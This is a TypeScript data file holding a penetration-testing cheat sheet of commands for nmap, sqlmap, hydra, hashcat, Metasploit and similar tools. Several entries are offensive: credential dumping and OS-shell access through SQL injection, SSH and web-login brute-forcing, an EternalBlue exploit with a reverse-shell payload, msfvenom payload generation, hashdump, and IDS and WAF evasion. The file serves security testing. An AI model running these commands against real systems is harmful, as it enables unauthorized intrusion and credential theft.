export type CheatEntry = {
  id: string;
  tool: string;
  title: string;
  command: string;
  desc: string;
  tags: string[];
};

export const CHEATSHEET_TOOLS = [
  { key: "nmap",       label: "Nmap",       icon: "🗺" },
  { key: "ffuf",       label: "ffuf",        icon: "🔍" },
  { key: "sqlmap",     label: "sqlmap",      icon: "🗄" },
  { key: "nuclei",     label: "Nuclei",      icon: "☢" },
  { key: "gobuster",   label: "Gobuster",    icon: "💨" },
  { key: "curl",       label: "curl",        icon: "🌐" },
  { key: "hydra",      label: "Hydra",       icon: "🐍" },
  { key: "hashcat",    label: "Hashcat",     icon: "🔓" },
  { key: "metasploit", label: "Metasploit",  icon: "🎯" },
  { key: "burpsuite",  label: "Burp Suite",  icon: "🔬" },
  { key: "git",        label: "Git Recon",   icon: "📂" },
  { key: "openssl",    label: "OpenSSL",     icon: "🔐" },
];

const C: CheatEntry[] = [
  // ── Nmap ─────────────────────────────────────────────────────────────────
  { id: "nmap-01", tool: "nmap", title: "Quick scan top 1000 ports", command: `nmap -sV -sC -oN scan.txt <target>`, desc: "Default scripts + version detection on top 1000 TCP ports.", tags: ["basic", "tcp"] },
  { id: "nmap-02", tool: "nmap", title: "Full TCP port scan", command: `nmap -p- -T4 -oN full.txt <target>`, desc: "Scan all 65535 TCP ports. T4 = aggressive timing.", tags: ["full", "tcp"] },
  { id: "nmap-03", tool: "nmap", title: "UDP scan top ports", command: `sudo nmap -sU --top-ports 200 -oN udp.txt <target>`, desc: "UDP scan top 200 ports. Requires root. Much slower than TCP.", tags: ["udp", "sudo"] },
  { id: "nmap-04", tool: "nmap", title: "Service + version detection", command: `nmap -sV --version-intensity 9 -p <ports> <target>`, desc: "Aggressive version detection on specific ports.", tags: ["version", "fingerprint"] },
  { id: "nmap-05", tool: "nmap", title: "OS fingerprinting", command: `sudo nmap -O --osscan-guess <target>`, desc: "Attempt to identify the operating system.", tags: ["os", "fingerprint"] },
  { id: "nmap-06", tool: "nmap", title: "Script: vuln scan", command: `nmap --script vuln -oN vuln.txt <target>`, desc: "Run NSE vulnerability detection scripts.", tags: ["vuln", "scripts"] },
  { id: "nmap-07", tool: "nmap", title: "Script: http-enum", command: `nmap --script http-enum -p 80,443 <target>`, desc: "Enumerate web server directories and files.", tags: ["web", "enum"] },
  { id: "nmap-08", tool: "nmap", title: "Script: smb-vuln", command: `nmap --script smb-vuln* -p 445 <target>`, desc: "Check for SMB vulnerabilities (EternalBlue, etc.).", tags: ["smb", "vuln"] },
  { id: "nmap-09", tool: "nmap", title: "Firewall evasion: fragment packets", command: `nmap -f -p <ports> <target>`, desc: "Fragment packets to evade some firewalls/IDS.", tags: ["evasion", "firewall"] },
  { id: "nmap-10", tool: "nmap", title: "Decoy scan", command: `nmap -D RND:10 <target>`, desc: "Use 10 random decoy IPs to hide your real source.", tags: ["evasion", "decoy"] },
  { id: "nmap-11", tool: "nmap", title: "Output all formats", command: `nmap -oA scan_results <target>`, desc: "Save in normal, XML, and grepable format simultaneously.", tags: ["output"] },
  { id: "nmap-12", tool: "nmap", title: "Ping sweep (host discovery)", command: `nmap -sn 192.168.1.0/24`, desc: "Discover live hosts in a subnet without port scanning.", tags: ["discovery", "network"] },

  // ── ffuf ─────────────────────────────────────────────────────────────────
  { id: "ffuf-01", tool: "ffuf", title: "Directory fuzzing", command: `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://target.com/FUZZ`, desc: "Fuzz directories and files. FUZZ is the position marker.", tags: ["dir", "basic"] },
  { id: "ffuf-02", tool: "ffuf", title: "Subdomain fuzzing", command: `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://FUZZ.target.com -H "Host: FUZZ.target.com"`, desc: "Fuzz subdomains via Host header (vhost fuzzing).", tags: ["subdomain", "vhost"] },
  { id: "ffuf-03", tool: "ffuf", title: "Parameter fuzzing (GET)", command: `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "https://target.com/page?FUZZ=1"`, desc: "Find hidden GET parameters.", tags: ["params", "get"] },
  { id: "ffuf-04", tool: "ffuf", title: "Filter by status code", command: `ffuf -w wordlist.txt -u https://target.com/FUZZ -fc 404`, desc: "-fc filters (removes) specified status codes from output.", tags: ["filter", "status"] },
  { id: "ffuf-05", tool: "ffuf", title: "Filter by response size", command: `ffuf -w wordlist.txt -u https://target.com/FUZZ -fs 1234`, desc: "Remove responses with a specific size (filter noise).", tags: ["filter", "size"] },
  { id: "ffuf-06", tool: "ffuf", title: "POST body fuzzing", command: `ffuf -w wordlist.txt -u https://target.com/login -X POST -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded"`, desc: "Fuzz POST body parameters.", tags: ["post", "form"] },
  { id: "ffuf-07", tool: "ffuf", title: "JSON body fuzzing", command: `ffuf -w wordlist.txt -u https://target.com/api -X POST -d '{"user":"FUZZ"}' -H "Content-Type: application/json"`, desc: "Fuzz JSON body values.", tags: ["post", "json", "api"] },
  { id: "ffuf-08", tool: "ffuf", title: "Rate limiting (delay)", command: `ffuf -w wordlist.txt -u https://target.com/FUZZ -rate 100 -p 0.1`, desc: "-rate limits requests per second. -p adds delay between requests.", tags: ["rate-limit", "stealth"] },
  { id: "ffuf-09", tool: "ffuf", title: "Recursive fuzzing", command: `ffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -recursion-depth 2`, desc: "Recursively fuzz found directories.", tags: ["recursive"] },
  { id: "ffuf-10", tool: "ffuf", title: "Multi-word fuzzing (W1/W2)", command: `ffuf -w users.txt:W1 -w passwords.txt:W2 -u https://target.com/login -X POST -d "user=W1&pass=W2"`, desc: "Use multiple wordlists with named positions.", tags: ["multi", "bruteforce"] },

  // ── sqlmap ────────────────────────────────────────────────────────────────
  { id: "sql-01", tool: "sqlmap", title: "Basic GET scan", command: `sqlmap -u "https://target.com/page?id=1" --batch`, desc: "--batch answers all prompts automatically.", tags: ["basic", "get"] },
  { id: "sql-02", tool: "sqlmap", title: "POST request scan", command: `sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch`, desc: "Test POST parameters for SQLi.", tags: ["post", "form"] },
  { id: "sql-03", tool: "sqlmap", title: "From Burp request file", command: `sqlmap -r request.txt --batch`, desc: "Save raw HTTP request from Burp, pass with -r.", tags: ["burp", "request-file"] },
  { id: "sql-04", tool: "sqlmap", title: "List databases", command: `sqlmap -u "https://target.com/?id=1" --dbs --batch`, desc: "Enumerate all accessible databases.", tags: ["enum", "databases"] },
  { id: "sql-05", tool: "sqlmap", title: "List tables", command: `sqlmap -u "https://target.com/?id=1" -D target_db --tables --batch`, desc: "List tables in a specific database.", tags: ["enum", "tables"] },
  { id: "sql-06", tool: "sqlmap", title: "Dump table", command: `sqlmap -u "https://target.com/?id=1" -D target_db -T users --dump --batch`, desc: "Dump all data from a specific table.", tags: ["dump", "data"] },
  { id: "sql-07", tool: "sqlmap", title: "Dump credentials only", command: `sqlmap -u "https://target.com/?id=1" -D target_db -T users -C username,password --dump --batch`, desc: "Dump specific columns only.", tags: ["dump", "columns"] },
  { id: "sql-08", tool: "sqlmap", title: "WAF bypass (tamper)", command: `sqlmap -u "https://target.com/?id=1" --tamper=space2comment,between --batch`, desc: "Apply tamper scripts to bypass WAF filters.", tags: ["waf-bypass", "tamper"] },
  { id: "sql-09", tool: "sqlmap", title: "Cookie injection", command: `sqlmap -u "https://target.com/" --cookie="session=abc; id=1*" --batch`, desc: "Mark injectable cookie param with *.", tags: ["cookie"] },
  { id: "sql-10", tool: "sqlmap", title: "OS shell (if stacked queries)", command: `sqlmap -u "https://target.com/?id=1" --os-shell --batch`, desc: "Attempt to spawn an OS shell via SQL injection.", tags: ["rce", "os-shell"] },
  { id: "sql-11", tool: "sqlmap", title: "Time-based blind (level 5)", command: `sqlmap -u "https://target.com/?id=1" --level=5 --risk=3 --batch`, desc: "Higher level/risk = more payloads. level 5 tests headers, cookies.", tags: ["blind", "thorough"] },

  // ── Nuclei ────────────────────────────────────────────────────────────────
  { id: "nuc-01", tool: "nuclei", title: "Basic scan with all templates", command: `nuclei -u https://target.com`, desc: "Scan with all community templates.", tags: ["basic"] },
  { id: "nuc-02", tool: "nuclei", title: "Scan list of hosts", command: `nuclei -l hosts.txt -o results.txt`, desc: "Scan multiple targets from a file.", tags: ["bulk"] },
  { id: "nuc-03", tool: "nuclei", title: "Severity filter", command: `nuclei -u https://target.com -severity critical,high`, desc: "Only run critical and high severity templates.", tags: ["filter", "severity"] },
  { id: "nuc-04", tool: "nuclei", title: "Tag filter", command: `nuclei -u https://target.com -tags cve,oast`, desc: "Run templates with specific tags.", tags: ["filter", "tag"] },
  { id: "nuc-05", tool: "nuclei", title: "CVE scan", command: `nuclei -u https://target.com -tags cve -severity critical,high,medium`, desc: "Scan for known CVEs only.", tags: ["cve"] },
  { id: "nuc-06", tool: "nuclei", title: "Update templates", command: `nuclei -update-templates`, desc: "Pull latest community templates.", tags: ["update"] },
  { id: "nuc-07", tool: "nuclei", title: "Custom template", command: `nuclei -u https://target.com -t /path/to/my-template.yaml`, desc: "Run a single custom template.", tags: ["custom"] },
  { id: "nuc-08", tool: "nuclei", title: "Rate limit scan", command: `nuclei -u https://target.com -rate-limit 100 -concurrency 10`, desc: "Control request rate and concurrency.", tags: ["rate-limit", "stealth"] },
  { id: "nuc-09", tool: "nuclei", title: "JSON output for automation", command: `nuclei -u https://target.com -json -o results.json`, desc: "Machine-readable JSON output for pipelines.", tags: ["output", "automation"] },
  { id: "nuc-10", tool: "nuclei", title: "Interactsh OOB detection", command: `nuclei -u https://target.com -tags oast`, desc: "Out-of-band detection via interactsh server.", tags: ["oob", "oast"] },

  // ── Gobuster ──────────────────────────────────────────────────────────────
  { id: "gob-01", tool: "gobuster", title: "Directory scan", command: `gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -o results.txt`, desc: "Basic directory and file brute-force.", tags: ["dir", "basic"] },
  { id: "gob-02", tool: "gobuster", title: "DNS subdomain enum", command: `gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`, desc: "Brute-force subdomains via DNS resolution.", tags: ["dns", "subdomain"] },
  { id: "gob-03", tool: "gobuster", title: "File extension fuzzing", command: `gobuster dir -u https://target.com -w wordlist.txt -x php,asp,aspx,jsp,txt,bak`, desc: "Append file extensions to each word.", tags: ["extensions", "files"] },
  { id: "gob-04", tool: "gobuster", title: "Vhost fuzzing", command: `gobuster vhost -u https://target.com -w subdomains.txt --append-domain`, desc: "Virtual host discovery via Host header.", tags: ["vhost", "subdomain"] },
  { id: "gob-05", tool: "gobuster", title: "Follow redirects + auth", command: `gobuster dir -u https://target.com -w wordlist.txt -r -U user -P pass`, desc: "-r follows redirects. -U/-P for basic auth.", tags: ["redirect", "auth"] },

  // ── curl ─────────────────────────────────────────────────────────────────
  { id: "curl-01", tool: "curl", title: "Show response headers", command: `curl -I https://target.com`, desc: "HEAD request — shows headers only.", tags: ["headers", "basic"] },
  { id: "curl-02", tool: "curl", title: "Follow redirects + show all", command: `curl -vL https://target.com`, desc: "-v verbose (shows request/response), -L follows redirects.", tags: ["verbose", "redirect"] },
  { id: "curl-03", tool: "curl", title: "POST JSON", command: `curl -X POST https://target.com/api -H "Content-Type: application/json" -d '{"key":"value"}' -v`, desc: "Send a JSON POST request.", tags: ["post", "json"] },
  { id: "curl-04", tool: "curl", title: "Send with cookie", command: `curl -b "session=abc123" https://target.com/api/profile`, desc: "Include cookie in request.", tags: ["cookie", "auth"] },
  { id: "curl-05", tool: "curl", title: "Custom headers", command: `curl -H "X-Forwarded-For: 127.0.0.1" -H "Authorization: Bearer TOKEN" https://target.com`, desc: "Add arbitrary request headers.", tags: ["headers", "auth"] },
  { id: "curl-06", tool: "curl", title: "Ignore SSL errors", command: `curl -k https://target.com`, desc: "-k skips TLS certificate verification. For self-signed certs.", tags: ["ssl", "bypass"] },
  { id: "curl-07", tool: "curl", title: "Upload file", command: `curl -F "file=@/path/to/file.php" https://target.com/upload`, desc: "Multipart file upload.", tags: ["upload", "file"] },
  { id: "curl-08", tool: "curl", title: "Save response to file", command: `curl -o response.html https://target.com`, desc: "Save output to file instead of stdout.", tags: ["output"] },
  { id: "curl-09", tool: "curl", title: "Time a request", command: `curl -o /dev/null -s -w "%{time_total}s\\n" https://target.com`, desc: "Measure total request time (useful for time-based blind detection).", tags: ["timing", "blind"] },
  { id: "curl-10", tool: "curl", title: "Test CORS", command: `curl -H "Origin: https://attacker.com" -I https://target.com/api/data`, desc: "Check Access-Control-Allow-Origin in response.", tags: ["cors"] },

  // ── Hydra ─────────────────────────────────────────────────────────────────
  { id: "hyd-01", tool: "hydra", title: "HTTP POST form brute-force", command: `hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"`, desc: "Brute-force web form login. Adjust field names and failure string.", tags: ["web", "brute-force"] },
  { id: "hyd-02", tool: "hydra", title: "SSH brute-force", command: `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com`, desc: "Brute-force SSH login.", tags: ["ssh"] },
  { id: "hyd-03", tool: "hydra", title: "FTP brute-force", command: `hydra -l admin -P passwords.txt ftp://target.com`, desc: "FTP credential brute-force.", tags: ["ftp"] },
  { id: "hyd-04", tool: "hydra", title: "User + password list", command: `hydra -L users.txt -P passwords.txt target.com http-post-form "/login:u=^USER^&p=^PASS^:fail"`, desc: "Use separate user and password lists.", tags: ["lists"] },

  // ── Hashcat ───────────────────────────────────────────────────────────────
  { id: "hash-01", tool: "hashcat", title: "MD5 cracking", command: `hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`, desc: "-m 0 = MD5. -a 0 = dictionary attack.", tags: ["md5", "dictionary"] },
  { id: "hash-02", tool: "hashcat", title: "SHA-1 cracking", command: `hashcat -m 100 -a 0 hashes.txt rockyou.txt`, desc: "-m 100 = SHA-1.", tags: ["sha1", "dictionary"] },
  { id: "hash-03", tool: "hashcat", title: "bcrypt cracking", command: `hashcat -m 3200 -a 0 hashes.txt rockyou.txt`, desc: "-m 3200 = bcrypt. Very slow by design.", tags: ["bcrypt", "slow"] },
  { id: "hash-04", tool: "hashcat", title: "NTLM (Windows) cracking", command: `hashcat -m 1000 -a 0 hashes.txt rockyou.txt`, desc: "-m 1000 = NTLM. Common in Windows/AD environments.", tags: ["ntlm", "windows"] },
  { id: "hash-05", tool: "hashcat", title: "JWT HS256 cracking", command: `hashcat -m 16500 -a 0 jwt.txt rockyou.txt`, desc: "-m 16500 = JWT. Crack weak HS256 signing secrets.", tags: ["jwt", "hs256"] },
  { id: "hash-06", tool: "hashcat", title: "Rule-based attack", command: `hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, desc: "Apply mutation rules (capitalize, append numbers, etc.).", tags: ["rules", "advanced"] },
  { id: "hash-07", tool: "hashcat", title: "Brute-force mask", command: `hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?d?d`, desc: "?u=uppercase ?l=lowercase ?d=digit. Mask = pattern.", tags: ["brute-force", "mask"] },

  // ── Metasploit ────────────────────────────────────────────────────────────
  { id: "msf-01", tool: "metasploit", title: "Search for exploit", command: `search type:exploit name:eternalblue`, desc: "Search modules by type and keyword.", tags: ["search"] },
  { id: "msf-02", tool: "metasploit", title: "Use + show options", command: `use exploit/windows/smb/ms17_010_eternalblue\nshow options`, desc: "Load a module and show required options.", tags: ["basic", "options"] },
  { id: "msf-03", tool: "metasploit", title: "Set target + run", command: `set RHOSTS 192.168.1.10\nset LHOST 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun`, desc: "Configure and launch an exploit.", tags: ["run", "payload"] },
  { id: "msf-04", tool: "metasploit", title: "Meterpreter basics", command: `sysinfo\ngetuid\ngetsystem\nhashdump\nshell`, desc: "Common meterpreter commands after session opens.", tags: ["meterpreter", "post-exploit"] },
  { id: "msf-05", tool: "metasploit", title: "Port scan with db_nmap", command: `db_nmap -sV -sC 192.168.1.0/24`, desc: "Nmap from within MSF, results stored in database.", tags: ["nmap", "recon"] },
  { id: "msf-06", tool: "metasploit", title: "Generate payload (msfvenom)", command: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o payload.elf`, desc: "Create standalone payload binary.", tags: ["msfvenom", "payload"] },

  // ── Burp Suite ────────────────────────────────────────────────────────────
  { id: "burp-01", tool: "burpsuite", title: "Intercept toggle", command: `Proxy → Intercept → On/Off  (shortcut: I)`, desc: "Enable/disable request interception.", tags: ["proxy", "intercept"] },
  { id: "burp-02", tool: "burpsuite", title: "Send to Repeater", command: `Right-click request → Send to Repeater  (Ctrl+R)`, desc: "Send captured request to Repeater for manual testing.", tags: ["repeater"] },
  { id: "burp-03", tool: "burpsuite", title: "Send to Intruder", command: `Right-click request → Send to Intruder  (Ctrl+I)`, desc: "Send to Intruder for automated fuzzing.", tags: ["intruder", "fuzzing"] },
  { id: "burp-04", tool: "burpsuite", title: "Intruder payload positions", command: `Intruder → Positions → Add §  around target param`, desc: "§ marks§ the injection position for payloads.", tags: ["intruder", "position"] },
  { id: "burp-05", tool: "burpsuite", title: "Active scan (Pro)", command: `Right-click → Scan → Active Scan`, desc: "Pro only: automated vulnerability scanner.", tags: ["scan", "pro"] },
  { id: "burp-06", tool: "burpsuite", title: "Decoder (encode/decode)", command: `Decoder tab → paste text → Smart decode / Encode as...`, desc: "Encode/decode URL, HTML, Base64, hex.", tags: ["decoder", "encoding"] },
  { id: "burp-07", tool: "burpsuite", title: "Comparer", command: `Right-click two requests → Send to Comparer`, desc: "Diff two requests or responses to spot differences.", tags: ["comparer", "diff"] },
  { id: "burp-08", tool: "burpsuite", title: "Match and Replace", command: `Proxy → Options → Match and Replace → Add rule`, desc: "Auto-replace headers/body values on every request.", tags: ["match-replace", "automation"] },

  // ── Git Recon ─────────────────────────────────────────────────────────────
  { id: "git-01", tool: "git", title: "Clone for recon", command: `git clone --depth=1 https://github.com/target/repo.git`, desc: "Clone only latest commit to save time/space.", tags: ["clone", "basic"] },
  { id: "git-02", tool: "git", title: "Search secrets in history", command: `git log --all --full-history -- "**/*.env"\ngit log -p --all -S "password" --source`, desc: "Search commit history for sensitive files or strings.", tags: ["secrets", "history"] },
  { id: "git-03", tool: "git", title: "Grep all commits for API keys", command: `git grep -n "api_key\\|secret\\|password" $(git rev-list --all)`, desc: "Search all commits for hardcoded secrets.", tags: ["secrets", "grep"] },
  { id: "git-04", tool: "git", title: "Show deleted files", command: `git log --diff-filter=D --summary | grep delete`, desc: "Find files that were deleted — may contain leaked data.", tags: ["deleted", "forensics"] },
  { id: "git-05", tool: "git", title: "truffleHog scan", command: `trufflehog git https://github.com/target/repo --only-verified`, desc: "Automated secret scanning with verified detectors.", tags: ["trufflehog", "secrets", "automated"] },

  // ── OpenSSL ───────────────────────────────────────────────────────────────
  { id: "ssl-01", tool: "openssl", title: "Check certificate", command: `openssl s_client -connect target.com:443 < /dev/null | openssl x509 -noout -text`, desc: "Retrieve and display TLS certificate details.", tags: ["cert", "tls"] },
  { id: "ssl-02", tool: "openssl", title: "Check supported ciphers", command: `nmap --script ssl-enum-ciphers -p 443 target.com`, desc: "Enumerate supported TLS cipher suites.", tags: ["ciphers", "audit"] },
  { id: "ssl-03", tool: "openssl", title: "Test specific TLS version", command: `openssl s_client -connect target.com:443 -tls1_1`, desc: "Force a specific TLS version to test if it's accepted.", tags: ["tls-version", "audit"] },
  { id: "ssl-04", tool: "openssl", title: "Generate self-signed cert", command: `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`, desc: "Create self-signed certificate (for local testing).", tags: ["generate", "cert"] },
  { id: "ssl-05", tool: "openssl", title: "Verify cert expiry", command: `echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates`, desc: "Show notBefore/notAfter dates.", tags: ["expiry", "cert"] },
];

export const CHEATSHEETS = C;
export default C;
